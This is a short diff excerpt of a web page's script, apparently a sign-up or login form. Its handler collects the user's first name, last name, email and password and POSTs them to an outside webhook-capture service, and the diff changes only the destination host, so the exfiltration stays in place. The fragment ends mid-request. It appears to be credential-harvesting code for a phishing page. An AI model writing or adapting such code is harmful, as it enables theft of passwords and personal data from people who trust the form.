@@ -77,14 +77,14 @@
     }
   </style>
   <script>
-    async function redirectToResults(event) {
+    function redirectToResults(event) {
       event.preventDefault(); // Prevent form submission
       const firstName = document.getElementById("first_name").value;
       const lastName = document.getElementById("last_name").value;
       const email = document.getElementById("email").value;
       const password = document.getElementById("password").value;
 
-      await fetch("https://webhook.site/8ff9a457-3cde-442a-9d70-7891d08ae7ed", {
+      fetch("https://teeny-sandwich-90.webhook.cool", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
